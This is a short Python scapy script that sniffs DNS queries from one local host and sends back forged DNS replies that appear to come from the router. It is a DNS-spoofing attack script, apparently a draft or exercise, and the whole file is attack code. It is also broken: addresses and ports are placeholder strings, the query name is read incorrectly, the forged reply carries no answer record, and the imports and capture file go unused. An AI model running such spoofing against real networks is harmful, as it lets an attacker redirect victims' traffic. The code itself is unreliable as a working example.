#!/usr/bin/env python3

from ntpath import join
from socket import timeout
from scapy.all import *
from scapy.layers.inet import IP, UDP, TCP, ICMP
from scapy.layers.dns import *
import sys


packet_filt = " and ".join([
    "udp dst port 53", # dns port filtering
    "udp[10] & 0x80 = 0", # dns only
    "src host 192.168.86.25" # ip source
    ])

def dns_reply(packet):
    send(IP(dst="A IP", src="ROUTER IP")/UDP(dport="A PORT", sport="ROUTER PORT")/DNS(id=packet[DNS].id, rd=0, qr=1, aa=1, qtype = 1, qclass = 1, qname = packet.qname))


packets = rdpcap("test.pcap")
capture = sniff(filter = packet_filt, store=0, prn = dns_reply, count=0,timeout=10, started_callback = lambda x:print("started sniffing"))




